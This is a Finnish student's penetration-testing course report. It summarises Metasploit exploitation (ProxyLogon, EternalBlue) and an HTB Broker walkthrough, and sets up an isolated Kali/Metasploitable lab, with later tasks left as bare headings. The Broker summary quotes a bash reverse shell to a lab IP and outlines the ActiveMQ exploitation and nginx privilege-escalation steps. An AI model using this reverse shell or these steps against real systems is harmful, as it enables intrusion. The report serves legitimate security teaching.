# Lab kid
Juho Tuovinen

Tässä raportissa aioin kertoa kuinka suoritin tehtävät, jotka on annettu Haaga Helian Tunkeutumisteustaus kurssilla. Tehtävät löytyvät [täältä](https://terokarvinen.com/2023/eettinen-hakkerointi-2023/#h3-lab-kid).

Tietokoneen speksit, jolla suoritan toimenpiteen:
- Apple MacBook 2015
- macOs Monterey versio 12.7
- Ram -muistia 16GB
- levytilaa/muistia vapaana 47,35 GB.

Ohjelmistot
- UTM Version 4.1.6 (75)
- VM OS: Kali Linux 2023.3 (kali-rolling)
- VirtualBox Version 7.0.6 r155176 (Qt5.15.2)

## Lue/katso ja tiivistä.
- Velu 2022: [Mastering Kali Linux for Advanced Penetration Testing 4ed: Chapter 10 - Exploitation](https://learning.oreilly.com/library/view/mastering-kali-linux/9781801819770/Text/Chapter_10.xhtml#_idParaDest-257): kappaleet "The Metasploit Framework", "The exploitation of targets using Metasploit" ja "Using public exploits".
  * The Metasploit Framework
    - Metasploit Framework on avoimen lähdekoodin työkalu, joka on suunniteltu helpottamaan penetraatiotestausta.
    - Kehys voidaan jakaa kolmeen osaan:
      - Kirjastot: MSF on rakennettu käyttämällä erilaisia toimintoja ja kirjastoja, kuten Ruby-ohjelmointikieltä. Penetraatiotestaajien on ymmärrettävä nämä toiminnot; miten ne laukaistaan, mitä parametreja niille tulisi antaa ja mitä odotettavissa olevat tulokset ovat
      - REX: REX on Metasploitissa mukana oleva kirjasto, jonka tarjoaa erilaisia luokkia, jotka ovat hyödyllisiä exploiteissa.
      - Moduulit: MSF moduulit ovat ohjelmakoodin osia, jotka suorittavat tietyn tehtävän hyökkäyksen aikana. Nämä moduulit voivat sisältää hyökkäyksiä, tietojen keräystä, skannausta ja muita taktiikoita.
  * Exploiting targets using MSF
    - Metasploit Framework on tehokas sekä käyttöjärjestelmän haavoittuvuuksien että kolmannen osapuolen sovellusten haavoittuvuuksien hyödyntämisessä
    - ProxyLogon-haavoittuvuus, jota Hafnium-ryhmä käytti hyväksi väärinkäyttämällä Microsoft Exchange Serveriä maaliskuussa 2021. Tämä johti laajoihin kyberhyökkäyksiin ja talouspetoksiin ympäri maailmaa. Neljä keskeistä hyödynnettävää haavoittuvuutta olivat:
      - CVE-2021-26855: Server Side Request Forgery (SSRF) - Hyökkääjät voivat lähettää erityisesti muotoiltuja HTTP-pyyntöjä etänä ilman tunnistautumista, ja palvelin hyväksyy epäluotettavat yhteydet TCP-porttiin 443.
      - CVE-2021-26857: Tämä on epävarma deserialisointihaavoittuvuus Microsoft Exchange Unified Messaging Servicessa (UMS), mikä mahdollistaa haitallisen koodin suorittamisen korkeilla SYSTEM-käyttöoikeuksilla. Tätä voidaan hyödyntää joko SSRF:n tai varastettujen tunnusten avulla.
      - CVE-2021-26858 ja CVE-2021-27065: Molemmat liittyvät mielivaltaiseen tiedoston kirjoitus -haavoittuvuuteen, joka mahdollistaa tiedostojen kirjoittamisen annettuun hakemistoon.
    - Seuraavassa esimerkissä yhdistämme CVE-2021-26855:n ohittaaksemme tunnistamisen ja jäljitelläksemme järjestelmänvalvojan tiliä, sekä CVE-2021-27065:n kirjoittaaksemme mielivaltaisen tiedoston hyötykuorman kanssa tarjotaksemme etäkoodin suorituksen palvelimella.
      - hyökkääjien on varmistettava, että kohde käyttää paikallista Microsoft Exchange Serveriä, joka on altistettu, ja lueteltava kaikki sähköpostiosoitteet onnistuneen hyökkäyksen suorittamiseksi. Testaajat voivat käyttää Python ProxyShell-enumerointiskriptiä luetteloidakseen kaikki käyttäjät, jotka ovat yhteydessä Exchange-palvelimiin. Onnistunut hyödyntäminen johtaa halutun koodin suoritukseen korkeilla SYSTEM-käyttöoikeuksilla.
      -  Kun hyökkäys on valmis, se avaa Meterpreter-reverse shellin kahden järjestelmän välille. Meterpreterin kehotteen tulisi avautua, ja testaaja voi käyttää etäjärjestelmää komentokehotteella. Yksi ensimmäisistä vaiheista kompromissin jälkeen on varmistaa, että olet kohdejärjestelmässä.
    - Toinen hyökkäys, jota tarkastelemme tässä osiossa, on MS17-010, joka aiheutti suurta vahinkoa WannaCry-lunnasohjelman avulla hyödyntäen EternalBlue-haavoittuvuutta huhtikuussa 2017.
      - Onnistunut hyödyntäminen mahdollistaa hyökkääjän suorittaa mielivaltaista koodia etäjärjestelmässä. Vaikka tämä hyökkäys on vanha, monet organisaatiot joutuvat edelleen turvautumaan joihinkin vanhoihin järjestelmiin.
      - Lopuksi hyödyntäminen tulisi tarjota meille vastaava Meterpreter-kuori kuin aiemmassa hyödyntämisessä. Hashdump-komento paljastaa kaikki käyttäjänimet ja salasanahajautukset. Lisäksi näiden tietojen tallentamiseksi verkossa liikkumisen tehostamiseksi testaajat voivat käyttää incognito- ja kiwi-moduuleja msfconsolessa.
  * Using public exploits
    - Jokainen hyökkääjä pitää silmällä jatkuvasti julkisia exploitteja ja muokkaa niitä tarpeidensa mukaisesti.
    - Usein penetraatiotestaajat löytävät nollapäivän hyödyntämisen testeissään, ja he yleensä ilmoittavat siitä yritykselle. Hyökkääjien tapauksessa kaikki löytyneet haavoittuvuudet muunnetaan exploiteiksi, jotka myydään rahasta/tunnustuksesta yrityksille.
    - Internetistä löytyy tietokantoja, jotka sisältävät exploiteja (Milw0rm, Exploit-DB (EDB)
    - Exploit-DB: EDB on tietokanta-arkisto julkisista exploiteista yhdessä haavoittuvien ohjelmistoversioiden kanssa. EDB on upotettu osaksi Kali Linux 2.0:aa osana julkaisua, ja sen avulla on melko helppo etsiä kaikkia saatavilla olevia exploiteja SearchSploitin kautta.
    - SearchSploit: yksinkertainen apuohjelma Kali Linuxissa, joka etsii kaikki exploitit EDB:stä avainsanahaulla hyökkäyksen alueen kaventamiseksi.


- Vapaavalintainen läpikävely [0xdf](https://0xdf.gitlab.io/) tai [ippsec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA/videos) (Kannattaa valita helppo; esim "Base Points: Easy")
  - [HTB: Broker](https://0xdf.gitlab.io/2023/11/09/htb-broker.html)
    - Broker on HackTheBoxin laatikko, joka korostaa vakavaa haavoittuvuutta ActiveMQ-viestijonovälittäjässä (CVE-2023-46604). Hyökkääjä hyödyntää tätä haavoittuvuutta saadakseen pääsyn järjestelmään, päästäkseen root-käyttäjäksi ja ajaa nginx:ää root-käyttäjänä, asettaa pystyyn valepalvelimen tiedostonlukua varten, ja lopulta kirjoittaa SSH-avaimen root-käyttäjälle. Lisäksi hän esittelee samanlaisen hyökkäystavan Zimbra-virhekonfiguraatiossa (CVE-2022-41347). Tässä tapauksessa hyökkääjä myrkyttää LD preload -tiedoston ajamalla nginx:n virhelokit kohti tuota tiedostoa ja lataamalla siihen haitallisen jaetun objektin.
    - Recon:
      - suorittaa Nmap-skannuksen ja löytää 9 avointa porttia (22,80,1883,5672,8161,39751,61613,61614,61616)
      - arvio porteista: SSH-portti voi olla hyödyllinen, portit 61613 ja 61616 liittyvät ActiveMQ:hun, portit 1883 ja 5672 liittyy viestijonoon, portit 8161 ja 61614 liittyvät Java-webpalvelimeen Jetty, portti 39751 on tuntematon ja OpenSSH-version perusteella todennäköisesti käytössä on Ubuntu 22.04 Jammy -versi.
      - Website - TCP 80:
        - sivusto kysyy tavallista HTTP-autentikointia
        - admin/admin-tunnukset toimivat. Autentikoinnin takana on on ActiveMQ:n hallintaliittymä
        - "Manage ActiveMQ broker" -linkki johtaa osoitteeseen /admin/: Tämä antaa mm. Broker ID:n, käynnissäolon ajan ja version
    - Shell as activemq:
      - tunnista haavoittuvuus
      - Ymmärrä exploit
      - aja POC
        - käynnistä Python-webpalvelin ja aja [Python-skripti](https://github.com/evkl1d/CVE-2023-46604)
        - webpalvelimella tapahtuu osuma, joten täytyy tarkastella XML-tiedostoa
        - hyökkäyksen mukana tulee poc.xml ja siinä kutsutaan selvästi perinteistä bash reverse shelliä, <code>bash -c 'bash -i >& /dev/tcp/10.10.10.10/9001'</code>
        - päivitä kuorman omaan IP-osoitteeseen ja isännöi sitä Python-webpalvelimella
        - kun nc kuuntelee portissa 9001, aja hyökkäys uudelleen. Se hakee poc.xml:n.
        - pääsy saadaan shelliin nc:n kautta. Tehdään shellin päivitys ja napataan user.txt-tiedosto
    - Shell as root:
      - käyttäjä "activemq" voi ajaa nginx-palvelinta juurikäyttäjänä ilman salasanaa
      - luodaan haitallinen web-palvelin
        - lähetään kyselyitä web-palvelimelle portissa 1337 ja voidaan lukea tiedostoja root-äyttäjänä
        - lippu tehtävään löytyy tiedostosta <code>localhost:1331/root/root.txt</code>

- Nyrkkeilysäkki ei kuulu. Etsi hakukoneesta kotitehtäväraportti, jossa Kali ja Metasploitable on asennettu samaan verkkooon VirtualBoxiin; sekä testaamalla osoitettu, että koneet on saatu irti Internetistä. Tällaiset tehtävät ovat olleet jonain vuonna esimerkiksi nimillä "Nyrkkeilysäkki" ja "Ei kuulu". (Löytyy hakukoneista, esimerkiksi hakusanoilla "[tero karvinen nyrkkeilysäkki](https://www.google.com/search?q=tero+karvinen+nyrkkeilys%C3%A4kki)". Raportit voivat olla pitkiä, vain nuo mainitut kohdat tarvitsee käsitellä)

  - Virtualboxin asetuksista asetetaan Metasploitable2 ja Kali host-only -verkkoon
  - Voidaan molemmilla koneilla pingata googlea <code>ping 8.8.8.8</code> ja vastaukseksi pitäsi tulla "Network is unreachable".
  - otetaan selvää löytävätkö koneet toisesnsa samasta verkosta pingaamalla toisiaan
    
Lähde: rikurikurikuriku, H2 Turbo Mode, b), GitHub,  https://github.com/rikurikurikuriku/PenTestCourse/wiki/H2-Turbo-Mode


## a) Asenna Kali virtuaalikoneeseen
Asennan Kali Linux -käyttöjärjestelmän VirtualBoxiin. Minulla on on valmiiksi ladattu Kali Linux 2023.2a iso-tiedosto (todettu toimivaksi omassa Macissani), jota käytän tehtävässä. Tiedosto peräisin kali.org. Annan koneelle seuraavat speksit:

- Base Memory: 4096 MB
- Processors: 4
- Disk Size: 50,00 GB

Asennus näytti edistyvän normaalisti, mutta bootatessa ruutu oli musta ja siinä välkkyi valkoinen kursori. Boottaus ei edennyt. Minulla on ollut aikaisemmin sama ongelma VirtualBoxin kanssa.


## b) Asenna Metasploitable 2 virtuaalikoneeseen
Menin ohjeiden mukaan: https://docs.rapid7.com/metasploit/metasploitable-2/
Latasin sen täältä: https://sourceforge.net/projects/metasploitable

Asensin https://www.youtube.com/watch?v=E3IJ_d3rAgA

Valitsin Host-ONly network
käynnistin koneen ja kirjauduin sisään.
<img src="/images/msf1.png" alt="" title="" width="70%" height="70%">


## c) Tee koneille virtuaaliverkko, jossa
- Kali saa yhteyden Internettiin, mutta sen voi laittaa pois päältä
- Kalin ja Metasploitablen välillä on host-only network, niin että porttiskannatessa ym. koneet on eristetty intenetistä, mutta ne saavat yhteyden toisiinsa
- Osoita eri komennoilla, että Internet-yhteys katkeaa: 'ping 1.1.1.1', 'ping www.google.com', 'curl www.google.com'

UTM-virtualisointiohjelmasta olen valinnut molempiin virtuali koneisiin Host-Only -vaihtoehdon. Tällä hetkellä Kali eikä Metasploitable ole yhteydessä internetiin ja testin suoritin pingaamalla googlea <code>ping 8.8.8.8</code>.
Kali:
<img src="/images/testi1.png" alt="" title="" width="70%" height="70%">
Metasploitable:
<img src="/images/msf2.png" alt="" title="" width="70%" height="70%">

Pingasin koneilla myös toisiaan testatakseni, että yhteys toisiinsa löytyy.

<img src="/images/testi2.png" alt="" title="" width="70%" height="70%">
<img src="/images/testi3.png" alt="" title="" width="70%" height="70%">


## d) Etsi Metasploitable porttiskannaamalla (db_nmap -sn). Tarkista selaimella, että löysit oikean IP:n - Metasploitablen weppipalvelimen etusivulla lukee Metasploitable. Katso, ettei skannauspaketteja vuoda Internetiin - kannattaa irrottaa koneet netistä skannatessa.
## e) Porttiskannaa Metasploitable huolellisesti (db_nmap -A -p0-). Analysoi tulos. Kerro myös ammatillinen mielipiteesi (uusi, vanha, tavallinen, erikoinen), jos jokin herättää ajatuksia.
## f) Murtaudu Metasploitablen VsFtpd-palveluun Metasploitilla (search vsftpd, use 0, set RHOSTS - varmista osoite huolella, exploit, id)
## g) Parempi sessio. Tee vsftpd-hyökkäyksestä saadusta sessiosta parempi. (Voit esimerkiksi päivittää sen meterpreter-sessioksi, laittaa tty:n toimimaan tai tehdä uuden käyttäjän ja ottaa yhteyden jollain tavallisella protokollalla)
## h) Etsi, tutki ja kuvaile jokin hyökkäys ExploitDB:sta. (Tässä harjoitustehtävässä pitää hakea ja kuvailla hyökkäys, itse hyökkääminen jää vapaaehtoiseksi lisätehtäväksi)
## i) Etsi, tutki ja kuvaile hyökkäys 'searchsploit' -komennolla. Muista päivittää. (Tässä harjoitustehtävässä pitää hakea ja kuvailla hyökkäys, itse hyökkääminen jää vapaaehtoiseksi lisätehtäväksi. Valitse eri hyökkäys kuin edellisessä kohdassa.)
## j) Kokeile vapaavalintaista haavoittuvuusskanneria johonkin Metasploitablen palveluun. (Esim. nikto, wpscan, openvas, nessus, nucleus tai joku muu)
## k) Kokeile jotain itsellesi uutta työkalua, joka mainittiin x-kohdan läpikävelyohjeessa.
## m) Vapaaehtoinen: Kokeile hyökkäystä, joka löytyy ExploitDB:sta. Huomaa, että joidenkin vanhempien hyökkäysten mukana tulee harjoitusmaali.
## n) Vapaaehtoinen: Murtaudu johonkin toiseen Metasploitablen palveluun.
## o) Vapaaehtoinen: Asenna ja korkkaa Metasploitable 3. Karvinen 2018: Install Metasploitable 3 – Vulnerable Target Computer

## Lähteet


Karvinen, Tero: Oppitunnit 2023-11-06, Tunkeutumistestaus, h2-Lab Kid (https://terokarvinen.com/2023/eettinen-hakkerointi-2023/#h3-lab-kid)

https://learning.oreilly.com/library/view/mastering-kali-linux/9781801819770/Text/Chapter_10.xhtml#_idParaDest-249

https://0xdf.gitlab.io/2023/11/09/htb-broker.html



